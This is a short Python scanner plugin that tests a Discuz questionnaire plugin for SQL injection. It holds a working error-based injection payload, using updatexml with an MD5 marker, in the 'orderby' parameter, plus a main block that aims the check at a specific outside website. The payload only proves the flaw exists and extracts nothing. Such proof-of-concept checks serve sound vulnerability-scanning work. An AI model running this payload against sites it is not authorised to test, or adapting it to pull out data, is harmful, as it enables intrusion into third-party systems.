# !/usr/bin/dev python
# -*- coding:utf-8 -*-
#_Author_= 7d0y
#_PlugName_ = Discuz问卷调查专业版插件注入
#_FileName_ = Discuzbest.py
#_Refer_ = http://0day5.com/archives/3188

import re
import time
import math

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(args):
    payload = "plugin.php?id=nds_up_ques:nds_ques_viewanswer&srchtxt=1&orderby=dateline%20and%201=(updatexml(1,concat(0x27,MD5(1)),1))--"
    verify_url = args + payload
    code, head,res, errcode, _ = curl.curl(verify_url)
    if code == 200 and "c4ca4238a0b923820dcc509a6f75849" in res:
        security_hole(verify_url)     
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.scol.cn/')[1])